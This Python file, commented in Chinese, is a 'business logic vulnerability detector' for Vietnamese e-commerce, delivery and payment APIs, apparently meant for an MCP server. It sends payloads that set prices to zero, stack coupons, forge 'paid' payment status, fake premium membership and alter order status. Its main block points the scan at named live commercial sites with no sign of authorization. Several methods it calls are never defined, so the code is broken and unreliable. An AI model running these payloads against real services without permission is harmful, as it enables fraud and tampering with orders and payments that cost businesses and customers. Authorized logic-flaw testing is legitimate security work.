#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
越南业务逻辑漏洞检测器
Vietnam Business Logic Vulnerability Detector

专门检测越南快递、物流、电商、订单系统的业务逻辑漏洞
检测范围:
- 订单价格操纵 (Price Manipulation)
- 配送费用绕过 (Shipping Fee Bypass)
- 优惠券滥用 (Coupon Abuse)
- 库存管理漏洞 (Inventory Management)
- 订单状态篡改 (Order Status Manipulation)
- 支付流程绕过 (Payment Process Bypass)
- 会员特权滥用 (Membership Privilege Abuse)
"""

import asyncio
import aiohttp
import json
import re
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
import logging

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("vietnam_business_logic_detector")

class BusinessLogicVulnType(Enum):
    """业务逻辑漏洞类型"""
    PRICE_MANIPULATION = "price_manipulation"
    SHIPPING_BYPASS = "shipping_bypass"
    COUPON_ABUSE = "coupon_abuse"
    INVENTORY_BYPASS = "inventory_bypass"
    ORDER_STATUS_BYPASS = "order_status_bypass"
    PAYMENT_BYPASS = "payment_bypass"
    MEMBERSHIP_ABUSE = "membership_abuse"
    REFUND_ABUSE = "refund_abuse"
    LOYALTY_ABUSE = "loyalty_abuse"
    DELIVERY_BYPASS = "delivery_bypass"

@dataclass
class BusinessLogicVulnerability:
    """业务逻辑漏洞信息"""
    vuln_id: str
    vuln_type: BusinessLogicVulnType
    severity: str
    target_system: str
    description: str
    vietnam_context: str
    test_payload: Dict[str, Any]
    exploitation_steps: List[str]
    business_impact: str
    remediation: str
    discovered_at: datetime

class VietnamBusinessLogicDetector:
    """越南业务逻辑漏洞检测器"""

    def __init__(self):
        self.session = None
        self.vietnam_business_rules = self._load_vietnam_business_rules()
        self.common_vulnerabilities = self._load_common_vulnerabilities()

    async def initialize(self):
        """初始化检测器"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'Accept-Currency': 'VND'
            }
        )
        logger.info("🔍 越南业务逻辑漏洞检测器已初始化")

    def _load_vietnam_business_rules(self) -> Dict:
        """加载越南业务规则"""
        return {
            "pricing_rules": {
                "min_order_value": 15000,  # 最小订单金额 (VND)
                "free_shipping_threshold": 250000,  # 免运费门槛 (VND)
                "max_discount_percentage": 50,  # 最大折扣百分比
                "tax_rate": 0.1,  # 税率
                "service_fee": 5000  # 服务费
            },
            "shipping_rules": {
                "base_fee": 15000,  # 基础运费
                "weight_multiplier": 2000,  # 重量倍数
                "distance_multiplier": 500,  # 距离倍数
                "express_surcharge": 10000,  # 快递附加费
                "remote_surcharge": 20000  # 偏远地区附加费
            },
            "payment_rules": {
                "max_cod_amount": 10000000,  # 最大货到付款金额
                "payment_timeout": 300,  # 支付超时时间(秒)
                "max_daily_transaction": 20000000,  # 日最大交易额
                "fraud_threshold": 5000000  # 欺诈阈值
            },
            "membership_rules": {
                "vip_threshold": 1000000,  # VIP门槛
                "discount_rates": {
                    "bronze": 0.05,
                    "silver": 0.1,
                    "gold": 0.15,
                    "platinum": 0.2
                }
            }
        }

    def _load_common_vulnerabilities(self) -> Dict:
        """加载常见业务逻辑漏洞"""
        return {
            "price_manipulation": {
                "description": "订单价格操纵漏洞",
                "vietnam_context": "越南电商系统价格验证不足，允许用户篡改商品价格",
                "test_endpoints": [
                    "/api/cart/update",
                    "/api/checkout/calculate",
                    "/api/order/create",
                    "/api/product/price"
                ],
                "payloads": [
                    {"price": 0, "original_price": 1000000},
                    {"price": -1000, "quantity": 1},
                    {"discount": 100, "max_discount": 50},
                    {"total_amount": 1000, "calculated_total": 1000000}
                ],
                "exploitation_steps": [
                    "拦截价格计算请求",
                    "修改商品价格为极小值",
                    "保持订单数量不变",
                    "完成支付流程"
                ]
            },
            "shipping_bypass": {
                "description": "配送费用绕过",
                "vietnam_context": "越南快递系统运费计算存在逻辑缺陷，可免除配送费用",
                "test_endpoints": [
                    "/api/shipping/calculate",
                    "/api/checkout/shipping",
                    "/api/delivery/fee"
                ],
                "payloads": [
                    {"shipping_fee": 0, "distance": 50},
                    {"weight": 0, "volume": 100},
                    {"express_delivery": True, "fee": 0},
                    {"remote_area": False, "address": "偏远地区"}
                ],
                "exploitation_steps": [
                    "分析运费计算逻辑",
                    "修改重量或距离参数",
                    "禁用额外服务费用",
                    "获得免费配送"
                ]
            },
            "coupon_abuse": {
                "description": "优惠券堆叠使用",
                "vietnam_context": "越南电商平台优惠券验证不严，允许重复或堆叠使用",
                "test_endpoints": [
                    "/api/coupon/apply",
                    "/api/cart/coupon",
                    "/api/promotion/validate"
                ],
                "payloads": [
                    {"coupons": ["DISCOUNT10", "DISCOUNT20", "DISCOUNT30"]},
                    {"coupon_code": "FIRSTORDER", "new_customer": True},
                    {"coupon_value": 1000000, "max_usage": 1}
                ],
                "exploitation_steps": [
                    "获取多个优惠券代码",
                    "同时应用多个优惠券",
                    "绕过使用次数限制",
                    "获得超额折扣"
                ]
            },
            "inventory_bypass": {
                "description": "库存管理漏洞",
                "vietnam_context": "越南商城系统库存验证不完整，可超量购买",
                "test_endpoints": [
                    "/api/product/check-stock",
                    "/api/cart/add",
                    "/api/order/validate"
                ],
                "payloads": [
                    {"product_id": 123, "quantity": 999999},
                    {"stock_check": False, "quantity": 1000},
                    {"reserved_stock": 0, "order_quantity": 500}
                ],
                "exploitation_steps": [
                    "检测库存检查逻辑",
                    "禁用库存验证",
                    "下超大数量订单",
                    "以正常价格获得超量商品"
                ]
            },
            "payment_bypass": {
                "description": "支付流程绕过",
                "vietnam_context": "越南支付系统状态验证不严格，可绕过支付步骤",
                "test_endpoints": [
                    "/api/payment/verify",
                    "/api/order/confirm",
                    "/api/transaction/status"
                ],
                "payloads": [
                    {"payment_status": "paid", "amount": 0},
                    {"transaction_id": "fake123", "verified": True},
                    {"payment_method": "cod", "amount": 0}
                ],
                "exploitation_steps": [
                    "分析支付验证流程",
                    "伪造支付成功状态",
                    "绕过金额验证",
                    "免费获得商品"
                ]
            },
            "membership_abuse": {
                "description": "会员特权滥用",
                "vietnam_context": "越南电商会员等级验证不严，可伪造高级会员身份",
                "test_endpoints": [
                    "/api/user/membership",
                    "/api/promotion/vip",
                    "/api/discount/member"
                ],
                "payloads": [
                    {"membership_level": "platinum", "spent": 0},
                    {"vip_status": True, "join_date": "2020-01-01"},
                    {"discount_rate": 0.3, "max_rate": 0.1}
                ],
                "exploitation_steps": [
                    "伪造会员等级信息",
                    "获得高级会员特权",
                    "享受超额折扣",
                    "滥用会员专享服务"
                ]
            }
        }

    async def detect_business_logic_vulnerabilities(self, target_url: str, system_type: str = "ecommerce") -> List[BusinessLogicVulnerability]:
        """检测业务逻辑漏洞"""
        logger.info(f"🔍 开始检测 {target_url} 的业务逻辑漏洞...")
        vulnerabilities = []

        # 根据系统类型调整检测策略
        if system_type == "express_delivery":
            vulnerabilities.extend(await self._test_express_delivery_logic(target_url))
        elif system_type == "ecommerce":
            vulnerabilities.extend(await self._test_ecommerce_logic(target_url))
        elif system_type == "payment":
            vulnerabilities.extend(await self._test_payment_logic(target_url))

        # 通用业务逻辑测试
        vulnerabilities.extend(await self._test_generic_business_logic(target_url))

        logger.info(f"✅ 检测完成，发现 {len(vulnerabilities)} 个业务逻辑漏洞")
        return vulnerabilities

    async def _test_express_delivery_logic(self, base_url: str) -> List[BusinessLogicVulnerability]:
        """测试快递业务逻辑"""
        vulnerabilities = []

        # 测试运费计算绕过
        shipping_vuln = await self._test_shipping_fee_bypass(base_url)
        if shipping_vuln:
            vulnerabilities.append(shipping_vuln)

        # 测试配送状态篡改
        delivery_vuln = await self._test_delivery_status_manipulation(base_url)
        if delivery_vuln:
            vulnerabilities.append(delivery_vuln)

        # 测试保价费用绕过
        insurance_vuln = await self._test_insurance_bypass(base_url)
        if insurance_vuln:
            vulnerabilities.append(insurance_vuln)

        return vulnerabilities

    async def _test_ecommerce_logic(self, base_url: str) -> List[BusinessLogicVulnerability]:
        """测试电商业务逻辑"""
        vulnerabilities = []

        # 测试价格操纵
        price_vuln = await self._test_price_manipulation(base_url)
        if price_vuln:
            vulnerabilities.append(price_vuln)

        # 测试优惠券滥用
        coupon_vuln = await self._test_coupon_abuse(base_url)
        if coupon_vuln:
            vulnerabilities.append(coupon_vuln)

        # 测试库存绕过
        inventory_vuln = await self._test_inventory_bypass(base_url)
        if inventory_vuln:
            vulnerabilities.append(inventory_vuln)

        # 测试会员特权滥用
        membership_vuln = await self._test_membership_abuse(base_url)
        if membership_vuln:
            vulnerabilities.append(membership_vuln)

        return vulnerabilities

    async def _test_payment_logic(self, base_url: str) -> List[BusinessLogicVulnerability]:
        """测试支付业务逻辑"""
        vulnerabilities = []

        # 测试支付绕过
        payment_vuln = await self._test_payment_bypass(base_url)
        if payment_vuln:
            vulnerabilities.append(payment_vuln)

        # 测试退款滥用
        refund_vuln = await self._test_refund_abuse(base_url)
        if refund_vuln:
            vulnerabilities.append(refund_vuln)

        # 测试交易限额绕过
        limit_vuln = await self._test_transaction_limit_bypass(base_url)
        if limit_vuln:
            vulnerabilities.append(limit_vuln)

        return vulnerabilities

    async def _test_generic_business_logic(self, base_url: str) -> List[BusinessLogicVulnerability]:
        """测试通用业务逻辑"""
        vulnerabilities = []

        # 测试订单状态篡改
        order_vuln = await self._test_order_status_manipulation(base_url)
        if order_vuln:
            vulnerabilities.append(order_vuln)

        return vulnerabilities

    async def _test_price_manipulation(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试价格操纵漏洞"""
        test_cases = [
            {"price": 0, "quantity": 1},
            {"price": -1000, "quantity": 1},
            {"price": 1000, "discount": 90},
            {"total_amount": 1000, "original_total": 1000000}
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/cart/update"
                async with self.session.post(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否接受异常价格
                        if "total" in result and result["total"] < 1000:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-PRICE-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.PRICE_MANIPULATION,
                                severity="Critical",
                                target_system=base_url,
                                description="发现价格操纵漏洞",
                                vietnam_context="越南电商系统未严格验证价格参数，允许恶意价格修改",
                                test_payload=payload,
                                exploitation_steps=[
                                    "拦截商品价格计算请求",
                                    f"设置价格为 {payload.get('price', 0)} VND",
                                    "保持其他参数正常",
                                    "完成下单流程"
                                ],
                                business_impact="用户可以极低价格购买商品，导致重大经济损失",
                                remediation="在服务器端严格验证所有价格参数，不接受客户端传入的价格",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"价格操纵测试失败: {e}")

        return None

    async def _test_shipping_fee_bypass(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试运费绕过漏洞"""
        test_cases = [
            {"weight": 0, "distance": 100},
            {"weight": 50, "distance": 0},
            {"express_delivery": True, "fee": 0},
            {"remote_area": False, "address": "Hà Tĩnh"}  # 偏远省份
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/shipping/calculate"
                async with self.session.post(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否免除了运费
                        if "fee" in result and result["fee"] == 0:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-SHIP-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.SHIPPING_BYPASS,
                                severity="High",
                                target_system=base_url,
                                description="发现运费计算绕过漏洞",
                                vietnam_context="越南快递系统运费计算存在逻辑缺陷，可通过参数篡改免除运费",
                                test_payload=payload,
                                exploitation_steps=[
                                    "分析运费计算API参数",
                                    f"设置{list(payload.keys())[0]}为异常值",
                                    "请求免费配送",
                                    "获得免运费服务"
                                ],
                                business_impact="用户可免除配送费用，造成运费收入损失",
                                remediation="在服务器端重新计算运费，不信任客户端传入的运费相关参数",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"运费绕过测试失败: {e}")

        return None

    async def _test_coupon_abuse(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试优惠券滥用漏洞"""
        test_cases = [
            {"coupons": ["WELCOME10", "SALE20", "VIP30"]},
            {"coupon_code": "EXPIRED", "bypass_expiry": True},
            {"coupon_value": 1000000, "min_order": 10000}
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/coupon/apply"
                async with self.session.post(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否成功应用多个优惠券
                        if "total_discount" in result and result["total_discount"] > 500000:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-COUPON-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.COUPON_ABUSE,
                                severity="High",
                                target_system=base_url,
                                description="发现优惠券滥用漏洞",
                                vietnam_context="越南电商优惠券系统允许堆叠使用，可获得超额折扣",
                                test_payload=payload,
                                exploitation_steps=[
                                    "收集多个有效优惠券代码",
                                    "同时应用多个优惠券",
                                    "绕过互斥使用限制",
                                    "获得巨额折扣"
                                ],
                                business_impact="用户可滥用优惠券获得远超正常折扣，造成营销损失",
                                remediation="实施严格的优惠券互斥策略，限制每个订单只能使用一个优惠券",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"优惠券滥用测试失败: {e}")

        return None

    async def _test_inventory_bypass(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试库存绕过漏洞"""
        test_cases = [
            {"product_id": 123, "quantity": 999999},
            {"check_stock": False, "quantity": 1000},
            {"reserve": False, "quantity": 500}
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/cart/add"
                async with self.session.post(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否允许超量购买
                        if "success" in result and result["success"]:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-STOCK-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.INVENTORY_BYPASS,
                                severity="High",
                                target_system=base_url,
                                description="发现库存管理漏洞",
                                vietnam_context="越南商城系统库存验证不完整，允许超量购买商品",
                                test_payload=payload,
                                exploitation_steps=[
                                    "找到目标商品ID",
                                    f"请求购买 {payload.get('quantity', 999999)} 件商品",
                                    "绕过库存检查逻辑",
                                    "以正常价格获得超量商品"
                                ],
                                business_impact="用户可超量购买商品，导致库存混乱和商业损失",
                                remediation="在每次库存操作时进行严格的库存检查和扣减",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"库存绕过测试失败: {e}")

        return None

    async def _test_payment_bypass(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试支付绕过漏洞"""
        test_cases = [
            {"payment_status": "paid", "amount": 0},
            {"transaction_id": "fake123", "verified": True},
            {"payment_method": "cod", " waive_payment": True}
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/payment/verify"
                async with self.session.post(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否伪造了支付状态
                        if "verified" in result and result["verified"]:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-PAY-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.PAYMENT_BYPASS,
                                severity="Critical",
                                target_system=base_url,
                                description="发现支付流程绕过漏洞",
                                vietnam_context="越南支付系统状态验证不严格，可伪造支付成功状态",
                                test_payload=payload,
                                exploitation_steps=[
                                    "分析支付验证流程",
                                    "伪造支付成功通知",
                                    "绕过金额验证",
                                    "免费获得商品或服务"
                                ],
                                business_impact="用户可绕过支付获得商品，造成直接经济损失",
                                remediation="实施严格的支付验证机制，与支付网关进行实时验证",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"支付绕过测试失败: {e}")

        return None

    async def _test_membership_abuse(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试会员特权滥用漏洞"""
        test_cases = [
            {"membership_level": "platinum", "total_spent": 0},
            {"vip_status": True, "join_date": "2020-01-01"},
            {"discount_rate": 0.3, "normal_rate": 0.05}
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/user/membership"
                async with self.session.put(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否成功伪造会员等级
                        if "level" in result and result["level"] in ["gold", "platinum"]:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-VIP-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.MEMBERSHIP_ABUSE,
                                severity="Medium",
                                target_system=base_url,
                                description="发现会员特权滥用漏洞",
                                vietnam_context="越南电商会员等级验证不严，可伪造高级会员身份",
                                test_payload=payload,
                                exploitation_steps=[
                                    "分析会员验证逻辑",
                                    f"伪造{payload.get('membership_level', 'platinum')}会员身份",
                                    "获得高级会员特权",
                                    "享受不匹配的折扣和服务"
                                ],
                                business_impact="普通用户可滥用高级会员特权，损害会员体系价值",
                                remediation="在服务器端严格验证会员等级，基于实际消费记录计算",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"会员特权滥用测试失败: {e}")

        return None

    async def _test_order_status_manipulation(self, base_url: str) -> Optional[BusinessLogicVulnerability]:
        """测试订单状态篡改漏洞"""
        test_cases = [
            {"order_id": 12345, "status": "delivered"},
            {"order_id": 12345, "payment_status": "paid"},
            {"order_id": 12345, "cancel_reason": None, "status": "cancelled"}
        ]

        for payload in test_cases:
            try:
                test_url = f"{base_url}/api/order/update"
                async with self.session.put(test_url, json=payload) as response:
                    if response.status == 200:
                        result = await response.json()

                        # 检查是否成功篡改状态
                        if "success" in result and result["success"]:
                            return BusinessLogicVulnerability(
                                vuln_id=f"VN-ORDER-{int(time.time())}",
                                vuln_type=BusinessLogicVulnType.ORDER_STATUS_BYPASS,
                                severity="High",
                                target_system=base_url,
                                description="发现订单状态篡改漏洞",
                                vietnam_context="越南订单系统状态验证不严格，可恶意修改订单状态",
                                test_payload=payload,
                                exploitation_steps=[
                                    "获取订单ID",
                                    f"将订单状态修改为 {payload.get('status', 'delivered')}",
                                    "绕过权限验证",
                                    "造成订单混乱"
                                ],
                                business_impact="恶意篡改订单状态可导致物流混乱和经济损失",
                                remediation="实施严格的订单状态变更权限控制和审计日志",
                                discovered_at=datetime.now()
                            )
            except Exception as e:
                logger.debug(f"订单状态篡改测试失败: {e}")

        return None

    def generate_vulnerability_report(self, vulnerabilities: List[BusinessLogicVulnerability]) -> str:
        """生成漏洞报告"""
        report = {
            "scan_info": {
                "scan_id": f"VN-BL-SCAN-{int(time.time())}",
                "scan_time": datetime.now().isoformat(),
                "total_vulnerabilities": len(vulnerabilities),
                "critical_count": len([v for v in vulnerabilities if v.severity == "Critical"]),
                "high_count": len([v for v in vulnerabilities if v.severity == "High"]),
                "medium_count": len([v for v in vulnerabilities if v.severity == "Medium"])
            },
            "vulnerabilities": []
        }

        for vuln in vulnerabilities:
            report["vulnerabilities"].append({
                "id": vuln.vuln_id,
                "type": vuln.vuln_type.value,
                "severity": vuln.severity,
                "target": vuln.target_system,
                "description": vuln.description,
                "vietnam_context": vuln.vietnam_context,
                "test_payload": vuln.test_payload,
                "exploitation_steps": vuln.exploitation_steps,
                "business_impact": vuln.business_impact,
                "remediation": vuln.remediation,
                "discovered_at": vuln.discovered_at.isoformat()
            })

        return json.dumps(report, ensure_ascii=False, indent=2)

    async def cleanup(self):
        """清理资源"""
        if self.session:
            await self.session.close()

# MCP工具函数
async def scan_vietnam_business_logic(url: str, system_type: str = "ecommerce") -> str:
    """扫描越南业务逻辑漏洞"""
    detector = VietnamBusinessLogicDetector()
    await detector.initialize()

    try:
        vulnerabilities = await detector.detect_business_logic_vulnerabilities(url, system_type)
        report = detector.generate_vulnerability_report(vulnerabilities)
        return report
    finally:
        await detector.cleanup()

# 主程序入口
if __name__ == "__main__":
    async def main():
        print("🛒 越南业务逻辑漏洞检测器")
        print("🎯 专门检测越南电商、快递、支付系统业务逻辑漏洞")
        print("=" * 60)

        # 测试目标
        test_targets = [
            {"url": "https://shopee.vn", "type": "ecommerce"},
            {"url": "https://vnpost.vn", "type": "express_delivery"},
            {"url": "https://momo.vn", "type": "payment"}
        ]

        detector = VietnamBusinessLogicDetector()
        await detector.initialize()

        try:
            for target in test_targets:
                print(f"\n🔍 检测目标: {target['url']} ({target['type']})")
                vulnerabilities = await detector.detect_business_logic_vulnerabilities(
                    target['url'],
                    target['type']
                )

                if vulnerabilities:
                    print(f"🚨 发现 {len(vulnerabilities)} 个业务逻辑漏洞:")
                    for vuln in vulnerabilities:
                        print(f"   • {vuln.vuln_type.value}: {vuln.description}")
                        print(f"     🇻🇳 {vuln.vietnam_context}")
                else:
                    print("✅ 未发现明显的业务逻辑漏洞")

                # 生成详细报告
                report = detector.generate_vulnerability_report(vulnerabilities)
                print(f"📋 详细报告已生成")

        finally:
            await detector.cleanup()

        print("\n🎯 业务逻辑检测器就绪，可集成到MCP服务器")

    asyncio.run(main())